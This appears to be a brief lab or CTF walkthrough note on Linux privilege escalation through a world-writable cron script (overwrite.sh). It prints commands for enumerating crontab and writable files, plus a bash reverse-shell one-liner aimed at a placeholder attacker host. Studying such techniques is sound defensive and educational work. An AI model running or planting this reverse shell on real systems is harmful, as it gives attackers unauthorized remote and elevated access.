# crontab

to display schedule task

```bash
cat /etc/crontab 
# And
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

![image.png](<../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png>)

we found two bash script so let’s know the privileges of this files

<figure><img src="../../../.gitbook/assets/image 1 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

so we found \[`overwrite.sh](http://overwrite.sh)` we can write in this file so let’s take a revers shell

```bash
bash -c 'bash -i >& /dev/tcp/AttackerIP/portnumber 0>&1'
```

<figure><img src="../../../.gitbook/assets/image 2 (2).png" alt=""><figcaption></figcaption></figure>
